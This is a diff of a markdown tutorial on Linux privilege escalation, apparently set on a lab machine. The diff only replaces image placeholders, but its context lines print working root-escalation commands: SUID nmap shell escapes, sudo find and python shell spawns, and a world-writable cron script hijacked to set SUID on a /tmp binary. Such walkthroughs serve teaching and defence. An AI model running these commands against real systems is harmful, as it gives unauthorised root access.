@@ -50,7 +50,7 @@ SUID which stands for set user ID, is a Linux feature that allows users to execu
 
 > **> -rwsr-xr-x****–** The ‘s’ character instead of ‘x’ indicates that the SUID bit is set.
 
-**image here_1
+![](1.png)
 
 SUID is a feature that, when used properly, actually enhances Linux security. The problem is that administrators may unknowingly introduce dangerous SUID configurations when they install third party applications or make logical configuration changes.
 
@@ -61,11 +61,11 @@ A large number of sysadmins don’t understand as where to set SUID bit and wher
 
 > $  **find / -perm -u=s -type f 2>/dev/null**  – It prints the executables which have SUID bit set
 
-image 2 here
+![](2.png)
 
 > **$ ls -la /usr/local/bin/nmap –**  Let’s confirm if nmap has SUID bit set or not.
 
-image 3 here
+![](3.png)
 
 Nmap has SUID bit set. A lot of times administrators set the SUID bit to nmap so that it can be used to scan the network efficiently as all the nmap scanning techniques does not work if you don’t run it with root privilege.
 
@@ -74,8 +74,7 @@ Nmap has SUID bit set. A lot of times administrators set the SUID bit to nmap so
 $  **nmap –interactive**  – runs nmap interactive mode  
 $  **!sh**  – Lets you escape to the system shell from nmap shell
 
-image 4 here
-
+![](4.png)
 
 
 # Exploiting SUDO rights/user
@@ -91,13 +90,13 @@ A classic example of this is assigning SUDO rights to the find command so that a
 
 > $ **sudo -l**  – Prints the commands which we are allowed to run as SUDO
 
-image 5 here
+![](5.png)
 
 We can run find, cat and python as SUDO. These all commands will run as root when run with SUDO. If we can somehow escape to the shell through any of these commands, we can get root access.
 
 $ sudo find /home -exec sh -i \; – find command’s exec parameter can be used for arbitrary code execution.
 
-image 6 here
+![](6.png)
 
 > Never give SUDO rights to any of the programming language compiler, interpreter and editors.
 
@@ -105,7 +104,7 @@ image 6 here
 
 $ sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’ – spawns a shell
 
-image 7 here
+![](7.png)
 
 # Exploiting badly configured cron jobs
 
@@ -121,24 +120,26 @@ Exploiting badly configured cron jobs to get root access
 
 > $  **ls -la /etc/cron.d**  – prints cron jobs which are already present in cron.d
 
-image 8 here
+![](8.png)
+
 
 **$ find / -perm -2 -type f 2>/dev/null –** prints world writable files
 
 $ **ls -la /usr/local/sbin/cron-logrotate.sh**  – Let’s confirm if the cron-logrotate.sh is world writable.
 
-image 9 here
+![](9.png)
+
 
 cron-lograte.sh is world writable and it is being run by logrotate cronjob. Any command we write/append in cron-lograte.sh would be executed as ‘root’.
  We write a C file in /tmp directory and compile it.
 
-image 10
+![](10.png)
 
 The rootme executable will spawn a shell.
 
 **$ ls -la rootme**  – It tells us that it is owned by user ‘SHayslett’
 
-image 11 here
+![](11.png)
 
 **$ echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh –** This will change the executable’s owner and group as root. It will also set the SUID bit.
 
@@ -150,4 +151,4 @@ $ **ls -la rootme** – After 5 minutes, the logrotate cronjob was run and cron-
 
 $ **./rootme** – spawns a root shell.
 
-image 11 here
+![](12.png)
